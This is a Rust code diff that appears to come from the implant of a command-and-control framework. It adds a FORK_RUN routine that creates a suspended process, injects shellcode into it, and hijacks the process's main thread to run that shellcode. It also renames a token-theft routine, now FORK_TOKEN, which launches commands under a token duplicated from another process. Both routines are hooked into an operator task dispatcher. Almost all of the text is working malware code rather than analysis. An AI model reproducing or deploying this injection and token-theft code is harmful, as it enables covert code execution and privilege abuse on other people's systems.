@@ -283,9 +283,66 @@ fn blockdlls() -> String {
 }
 
 // ── FORK_RUN ──────────────────────────────────────────────────────────────────
+// Spawn a sacrificial process suspended, inject shellcode, hijack its main
+// thread to execute it.  Mirrors the C/Go/Nim FORK_RUN behaviour.
 
-unsafe fn fork_run(src_pid: u32, cmd: &str) -> String {
-    // Open source process and duplicate its primary token.
+unsafe fn fork_run_sc(sc: &[u8], process: &str) -> String {
+    let proc_path = if process.is_empty() {
+        "C:\\Windows\\System32\\notepad.exe"
+    } else {
+        process
+    };
+
+    let mut si: STARTUPINFOW = std::mem::zeroed();
+    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
+    let mut target_w = wide(proc_path);
+
+    if CreateProcessW(
+        std::ptr::null(), target_w.as_mut_ptr(),
+        std::ptr::null(), std::ptr::null(), 0,
+        CREATE_SUSPENDED, std::ptr::null(), std::ptr::null(),
+        &si, &mut pi,
+    ) == 0 {
+        return format!("CreateProcessW({}) failed (err {})", proc_path, GetLastError());
+    }
+
+    let mem = VirtualAllocEx(
+        pi.hProcess, std::ptr::null(), sc.len(),
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
+    );
+    if mem.is_null() {
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return format!("VirtualAllocEx failed (err {})", GetLastError());
+    }
+
+    let mut written = 0usize;
+    WriteProcessMemory(pi.hProcess, mem, sc.as_ptr() as *const _, sc.len(), &mut written);
+
+    let mut old = 0u32;
+    VirtualProtectEx(pi.hProcess, mem, sc.len(), PAGE_EXECUTE_READ, &mut old);
+
+    let mut ctx: CONTEXT = std::mem::zeroed();
+    ctx.ContextFlags = CONTEXT_FULL_AMD64;
+    if GetThreadContext(pi.hThread, &mut ctx) != 0 {
+        ctx.Rip = mem as u64;
+        SetThreadContext(pi.hThread, &ctx);
+    }
+
+    let child_pid = pi.dwProcessId;
+    ResumeThread(pi.hThread);
+    CloseHandle(pi.hThread);
+    WaitForSingleObject(pi.hProcess, 60_000);
+    CloseHandle(pi.hProcess);
+
+    format!("[+] fork_run: {} B shellcode executed in {} (PID {})", sc.len(), proc_path, child_pid)
+}
+
+// ── FORK_TOKEN ────────────────────────────────────────────────────────────────
+// Duplicate a token from src_pid and spawn cmd with it.
+
+unsafe fn fork_token(src_pid: u32, cmd: &str) -> String {
     let hproc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, src_pid);
     if hproc == 0 {
         return format!("OpenProcess failed (err {})", GetLastError());
@@ -308,7 +365,6 @@ unsafe fn fork_run(src_pid: u32, cmd: &str) -> String {
     }
     CloseHandle(htok);
 
-    // Launch the command with the duplicated token.
     let mut si: STARTUPINFOW = std::mem::zeroed();
     si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
     let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
@@ -329,7 +385,7 @@ unsafe fn fork_run(src_pid: u32, cmd: &str) -> String {
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
 
-    format!("[+] fork_run: '{}' launched with token from PID {} (child PID={})",
+    format!("[+] fork_token: '{}' launched with token from PID {} (child PID={})",
         cmd, src_pid, pi.dwProcessId)
 }
 
@@ -393,14 +449,26 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
         }
 
         "FORK_RUN" => {
+            if task.payload.is_empty() {
+                t.send_result(task.id, "", "FORK_RUN requires a shellcode payload");
+                return true;
+            }
+            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+            let proc_name = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
+            let r = unsafe { fork_run_sc(&task.payload, proc_name) };
+            t.send_result(task.id, &r, "");
+            true
+        }
+
+        "FORK_TOKEN" => {
             let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
             let pid = j.get("pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
             let cmd = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("cmd.exe /c whoami");
             if pid == 0 {
-                t.send_result(task.id, "", "FORK_RUN requires {\"pid\":N,\"cmd\":\"...\"}");
+                t.send_result(task.id, "", "FORK_TOKEN requires {\"pid\":N,\"cmd\":\"...\"}");
                 return true;
             }
-            let r = unsafe { fork_run(pid, cmd) };
+            let r = unsafe { fork_token(pid, cmd) };
             t.send_result(task.id, &r, "");
             true
         }
